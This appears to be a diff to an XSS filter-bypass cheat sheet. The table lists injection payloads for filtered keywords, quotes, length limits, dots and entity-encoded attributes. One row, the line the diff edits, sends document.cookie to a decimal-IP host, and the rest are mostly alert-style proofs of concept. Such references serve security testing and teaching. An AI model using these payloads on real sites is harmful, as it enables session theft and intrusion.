@@ -265,7 +265,7 @@ CSP does not protect against `javascript:` URLs in navigation context.
 | `alert` keyword filtered | `confirm(1)`, `prompt(1)`, `print()`, `top.alert(1)`, `window['al'+'ert'](1)`, `Function('alert(1)')()` |
 | Quotes filtered | Use event handlers without quotes: `<img src=x onerror=alert(1)>`, template literals: `alert\`1\`` |
 | Length limit | External script: `<script src=//short.url/x></script>`, use short redirection |
-| Points/dots filtered | Decimal IP + bracket notation: `window["location"]="http://1558071511/"["concat"](document["cookie"])` |
+| Points/dots filtered | Decimal IP + bracket notation: `window["location"]="http://3221226004/"["concat"](document["cookie"])` |
 | HTML entities in attribute | Works natively: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` |
 
 ### CSP Bypass
